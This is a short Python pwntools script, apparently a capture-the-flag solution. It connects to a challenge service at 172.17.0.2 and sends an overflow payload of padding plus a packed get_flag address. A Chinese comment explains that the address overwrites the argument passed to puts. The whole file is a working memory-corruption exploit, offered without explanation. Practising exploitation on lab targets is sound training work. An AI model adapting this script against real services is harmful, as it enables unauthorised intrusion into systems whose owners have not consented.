#!/usr/bin/python
#coding:utf-8
#使用get_flag的地址覆盖掉put的参数地址

from pwn import *
context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.2', 10001)
get_flag=0x0804A080
payload='A'*8+p32(get_flag)
print io.recv()
io.sendline(payload)
print io.recv()